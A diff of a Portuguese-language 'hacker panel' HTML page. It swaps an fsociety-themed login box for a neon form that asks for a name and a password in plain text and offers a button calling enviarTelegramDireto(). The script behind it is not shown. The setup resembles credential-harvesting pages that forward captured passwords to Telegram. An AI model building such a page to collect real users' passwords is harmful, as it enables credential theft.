@@ -3,28 +3,20 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>PAINEL FSOCIETY</title>
-  <link rel="stylesheet" href="style.css"/>
+  <title>Painel Hacker</title>
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <!-- Efeitos visuais -->
-  <div class="glitch-overlay"></div>
-  <div class="red-flash"></div>
-
-  <!-- Login -->
-  <div class="login-box">
-    <h2>PAINEL FSOCIETY</h2>
-    <form action="painel.html" method="POST">
-      <div class="user-box">
-        <input type="text" name="username" required>
-        <label>Usuário</label>
-      </div>
-      <div class="user-box">
-        <input type="password" name="password" required>
-        <label>Senha</label>
-      </div>
-      <button type="submit" class="login-btn">ENTRAR</button>
+  <div class="container">
+    <h1>Painel Hacker Verde Neon</h1>
+    <form id="dataForm">
+      <input type="text" id="nome" placeholder="Nome" required />
+      <input type="text" id="senha" placeholder="Senha" required />
+      <button type="submit">Enviar Dados</button>
     </form>
+    <button onclick="enviarTelegramDireto()">Enviar Alerta Manual</button>
   </div>
+
+  <script src="script.js"></script>
 </body>
 </html>
